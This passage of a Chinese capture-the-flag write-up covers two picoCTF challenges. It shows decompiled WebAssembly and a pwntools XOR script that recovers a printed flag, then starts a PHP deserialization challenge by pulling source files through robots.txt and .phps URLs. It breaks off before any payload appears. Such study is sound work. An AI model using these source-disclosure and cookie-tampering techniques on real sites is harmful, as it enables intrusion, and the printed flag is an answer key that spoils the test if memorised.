    <span class="token keyword">var</span> t<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> u<span class="token operator">:</span>int <span class="token operator">=</span> s <span class="token operator">&amp;</span> t<span class="token punctuation">;</span>
    <span class="token keyword">var</span> v<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>
    <span class="token keyword">var</span> w<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> x<span class="token operator">:</span>int <span class="token operator">=</span> v <span class="token operator">&amp;</span> w<span class="token punctuation">;</span>
    <span class="token keyword">var</span> y<span class="token operator">:</span>int <span class="token operator">=</span> u <span class="token operator">-</span> x<span class="token punctuation">;</span>
    e<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> y<span class="token punctuation">;</span>
    goto B_a<span class="token punctuation">;</span>
    label B_c<span class="token operator">:</span>
    <span class="token keyword">var</span> z<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>
    <span class="token keyword">var</span> aa<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> ba<span class="token operator">:</span>int <span class="token operator">=</span> z <span class="token operator">&amp;</span> aa<span class="token punctuation">;</span>
    <span class="token keyword">var</span> ca<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>
    <span class="token keyword">var</span> da<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> ea<span class="token operator">:</span>int <span class="token operator">=</span> ca <span class="token operator">&amp;</span> da<span class="token punctuation">;</span>
    <span class="token keyword">var</span> fa<span class="token operator">:</span>int <span class="token operator">=</span> ba<span class="token punctuation">;</span>
    <span class="token keyword">var</span> ga<span class="token operator">:</span>int <span class="token operator">=</span> ea<span class="token punctuation">;</span>
    <span class="token keyword">var</span> ha<span class="token operator">:</span>int <span class="token operator">=</span> fa <span class="token operator">==</span> ga<span class="token punctuation">;</span>
    <span class="token keyword">var</span> ia<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> ja<span class="token operator">:</span>int <span class="token operator">=</span> ha <span class="token operator">&amp;</span> ia<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ja<span class="token punctuation">)</span> <span class="token keyword">continue</span> L_b<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">var</span> ka<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>
  <span class="token keyword">var</span> la<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> ma<span class="token operator">:</span>int <span class="token operator">=</span> ka <span class="token operator">&amp;</span> la<span class="token punctuation">;</span>
  <span class="token keyword">var</span> na<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>
  <span class="token keyword">var</span> oa<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> pa<span class="token operator">:</span>int <span class="token operator">=</span> na <span class="token operator">&amp;</span> oa<span class="token punctuation">;</span>
  <span class="token keyword">var</span> qa<span class="token operator">:</span>int <span class="token operator">=</span> ma <span class="token operator">-</span> pa<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> qa<span class="token punctuation">;</span>
  label B_a<span class="token operator">:</span>
  <span class="token keyword">var</span> ra<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span>int<span class="token punctuation">;</span>
  <span class="token keyword">return</span> ra<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">check_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>int <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> a<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> b<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1072</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> c<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> d<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> e<span class="token operator">:</span>int <span class="token operator">=</span> d<span class="token punctuation">;</span>
  <span class="token keyword">var</span> f<span class="token operator">:</span>int <span class="token operator">=</span> a<span class="token punctuation">;</span>
  <span class="token keyword">var</span> g<span class="token operator">:</span>int <span class="token operator">=</span> e <span class="token operator">!=</span> f<span class="token punctuation">;</span>
  <span class="token keyword">var</span> h<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> i<span class="token operator">:</span>int <span class="token operator">=</span> g <span class="token operator">^</span> h<span class="token punctuation">;</span>
  <span class="token keyword">var</span> j<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> k<span class="token operator">:</span>int <span class="token operator">=</span> i <span class="token operator">&amp;</span> j<span class="token punctuation">;</span>
  <span class="token keyword">return</span> k<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token operator">:</span>int<span class="token punctuation">,</span> b<span class="token operator">:</span>int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> c<span class="token operator">:</span>int <span class="token operator">=</span> g_a<span class="token punctuation">;</span>
  <span class="token keyword">var</span> d<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> e<span class="token operator">:</span>int_ptr <span class="token operator">=</span> c <span class="token operator">-</span> d<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">;</span>
  <span class="token keyword">var</span> f<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">eqz</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span> goto B_a<span class="token punctuation">;</span>
  <span class="token keyword">var</span> g<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> h<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> i<span class="token operator">:</span>int <span class="token operator">=</span> g <span class="token operator">^</span> h<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
  label B_a<span class="token operator">:</span>
  <span class="token keyword">var</span> j<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> k<span class="token operator">:</span>byte_ptr <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  k<span class="token punctuation">[</span><span class="token number">1072</span><span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>check_flag</code>与上一题很是类似，几乎一样，所以这里判断flag所在是在最后一个操作中，也就是<code>copy</code></p>
<pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token operator">:</span>int<span class="token punctuation">,</span> b<span class="token operator">:</span>int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> c<span class="token operator">:</span>int <span class="token operator">=</span> g_a<span class="token punctuation">;</span>
  <span class="token keyword">var</span> d<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> e<span class="token operator">:</span>int_ptr <span class="token operator">=</span> c <span class="token operator">-</span> d<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">;</span>
  <span class="token keyword">var</span> f<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">eqz</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span> goto B_a<span class="token punctuation">;</span>
  <span class="token keyword">var</span> g<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> h<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> i<span class="token operator">:</span>int <span class="token operator">=</span> g <span class="token operator">^</span> h<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
  label B_a<span class="token operator">:</span>
  <span class="token keyword">var</span> j<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> k<span class="token operator">:</span>byte_ptr <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  k<span class="token punctuation">[</span><span class="token number">1072</span><span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>而且在<code>check_flag</code>中也有一个异或操作。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">var i:int <span class="token operator">=</span> g ^ h<span class="token punctuation">;</span>
var j:int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
var k:int <span class="token operator">=</span> i <span class="token operator">&amp;</span> j<span class="token punctuation">;</span></code></pre>

<p>明显是在对比这一段。</p>
<p>然后看的是这里</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">var b:int <span class="token operator">=</span> <span class="token number">1072</span><span class="token punctuation">;</span>
var c:int <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
var d:int <span class="token operator">=</span> strcmp<span class="token punctuation">(</span>c, b<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>取<code>1024</code>，所以可以确定flag是与这里有关。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">data d_xakgKNs989l1im8i890088k09nj9<span class="token punctuation">(</span>offset: <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">=</span> 
<span class="token string">"xakgK\Ns9=8:9l1?im8i&lt;89?00>88k09=nj9kimnu<span class="token entity" title="\00">\00</span><span class="token entity" title="\00">\00</span>"</span><span class="token punctuation">;</span></code></pre>

<p>结合copy中的异或操作。<code>h=8</code></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>xor<span class="token punctuation">(</span><span class="token string">"xakgK\\Ns9=8:9l1?im8i&lt;89?00>88k09=nj9kimnu\00\00"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#b'picoCTF&#123;15021d97ae0a401788600c815fb1caef&#125;\x08\x08'</span></code></pre>

<h1 id="Super-Serial"><a href="#Super-Serial" class="headerlink" title="Super Serial"></a>Super Serial</h1><p>很有学习价值的一道题目。现在来复现一遍。<br>打开<code>robots.txt</code>看到了什么？</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">User-agent:</span> *
<span class="token header-name keyword">Disallow:</span> /admin.phps</code></pre>

<p>访问一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>
└─<span class="token comment"># curl  http://mercury.picoctf.net:2148/admin.phps</span>
Not Found</code></pre>

<p>那<code>admin.php</code>有<code>admin.phps</code>，<code>index.php</code>是不是也有<code>index.phps</code>呢</p>
<pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">┌──(root💀m0re)-[~&#x2F;桌面&#x2F;CTF]
└─# curl  http:&#x2F;&#x2F;mercury.picoctf.net:2148&#x2F;index.phps
&lt;?php
require_once(&quot;cookie.php&quot;);

if(isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;]))&#123;
        $con &#x3D; new SQLite3(&quot;..&#x2F;users.db&quot;);
        $username &#x3D; $_POST[&quot;user&quot;];
        $password &#x3D; $_POST[&quot;pass&quot;];
        $perm_res &#x3D; new permissions($username, $password);
        if ($perm_res-&gt;is_guest() || $perm_res-&gt;is_admin()) &#123;
                setcookie(&quot;login&quot;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &quot;&#x2F;&quot;);
                header(&quot;Location: authentication.php&quot;);
                die();
        &#125; else &#123;
                $msg &#x3D; &#39;&lt;h6 class&#x3D;&quot;text-center&quot; style&#x3D;&quot;color:red&quot;&gt;Invalid Login.&lt;&#x2F;h6&gt;&#39;;
        &#125;
&#125;
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;link href&#x3D;&quot;https:&#x2F;&#x2F;stackpath.bootstrapcdn.com&#x2F;bootstrap&#x2F;4.3.1&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot; integrity&#x3D;&quot;sha384-ggOyR0iXCbMQv3Xipma34MD+dH&#x2F;1fQ784&#x2F;j6cY&#x2F;iJTQUOhcWr7x9JvoRxT2MZw1T&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;
&lt;link href&#x3D;&quot;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;
&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;stackpath.bootstrapcdn.com&#x2F;bootstrap&#x2F;4.3.1&#x2F;js&#x2F;bootstrap.min.js&quot; integrity&#x3D;&quot;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf&#x2F;nJGzIxFDsf4x0xIM+B07jRM&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;
&lt;&#x2F;head&gt;
        &lt;body&gt;
                &lt;div class&#x3D;&quot;container&quot;&gt;
                        &lt;div class&#x3D;&quot;row&quot;&gt;
                                &lt;div class&#x3D;&quot;col-sm-9 col-md-7 col-lg-5 mx-auto&quot;&gt;
                                        &lt;div class&#x3D;&quot;card card-signin my-5&quot;&gt;
                                                &lt;div class&#x3D;&quot;card-body&quot;&gt;
                                                        &lt;h5 class&#x3D;&quot;card-title text-center&quot;&gt;Sign In&lt;&#x2F;h5&gt;
                                                        &lt;?php if (isset($msg)) echo $msg; ?&gt;
                                                        &lt;form class&#x3D;&quot;form-signin&quot; action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot;&gt;
                                                                &lt;div class&#x3D;&quot;form-label-group&quot;&gt;
                                                                        &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;user&quot; name&#x3D;&quot;user&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Username&quot; required autofocus&gt;
                                                                        &lt;label for&#x3D;&quot;user&quot;&gt;Username&lt;&#x2F;label&gt;
                                                                &lt;&#x2F;div&gt;

                                                                &lt;div class&#x3D;&quot;form-label-group&quot;&gt;
                                                                        &lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;pass&quot; name&#x3D;&quot;pass&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Password&quot; required&gt;
                                                                        &lt;label for&#x3D;&quot;pass&quot;&gt;Password&lt;&#x2F;label&gt;
                                                                &lt;&#x2F;div&gt;

                                                                &lt;button class&#x3D;&quot;btn btn-lg btn-primary btn-block text-uppercase&quot; type&#x3D;&quot;submit&quot;&gt;Sign in&lt;&#x2F;button&gt;
                                                        &lt;&#x2F;form&gt;
                                                &lt;&#x2F;div&gt;
                                        &lt;&#x2F;div&gt;
                                &lt;&#x2F;div&gt;
                        &lt;&#x2F;div&gt;
                &lt;&#x2F;div&gt;
        &lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;</code></pre>

<p>主要部分为PHP代码如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cookie.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"../users.db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$perm_res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">permissions</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$perm_res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">,</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">86400</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: authentication.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;h6 class="text-center" style="color:red">Invalid Login.&lt;/h6>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>get到一个cookie.php，当然，可以使用上面的方法，得到它的源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">permissions</span>
<span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$u</span><span class="token punctuation">;</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token variable">$u</span><span class="token punctuation">.</span><span class="token variable">$p</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$guest</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>

                <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"../users.db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>
                <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SELECT admin, username FROM users WHERE username=? AND password=?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$rest</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token variable">$guest</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">return</span> <span class="token variable">$guest</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>

                <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"../users.db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>
                <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SELECT admin, username FROM users WHERE username=? AND password=?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$rest</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">return</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
